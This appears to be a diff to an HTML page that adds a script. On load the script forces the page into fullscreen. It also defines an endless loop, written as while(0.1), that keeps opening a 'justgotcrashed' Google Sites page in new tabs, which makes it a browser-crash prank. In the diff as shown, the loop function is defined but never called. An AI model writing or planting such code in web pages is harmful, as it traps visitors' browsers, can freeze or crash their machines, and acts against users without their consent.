@@ -6,7 +6,28 @@
 
 </head>
 <body style="background-image: url('3dgifmaker41007.gif'); background-size: cover;" >
+<script>
+    function launchFullScreen(element) {
+  if(element.requestFullScreen) {
+    element.requestFullScreen();
+  } else if(element.mozRequestFullScreen) {
+    element.mozRequestFullScreen();
+  } else if(element.webkitRequestFullScreen) {
+    element.webkitRequestFullScreen();
+  }
+}
 
+// Launch fullscreen for browsers that support it!
+launchFullScreen(document.documentElement); // the whole page
+launchFullScreen(document.getElementById("videoElement")); 
+function openMultipleWindows() {
+    do {
+    window.open('https://sites.google.com/view/justgotcrashed/home', '_blank');
+  window.open('https://sites.google.com/view/justgotcrashed/home', '_blank');
+  window.open('https://sites.google.com/view/justgotcrashed/home', '_blank');
+    }
+        while(0.1)
+}</script>
 </body>
 
 </html>
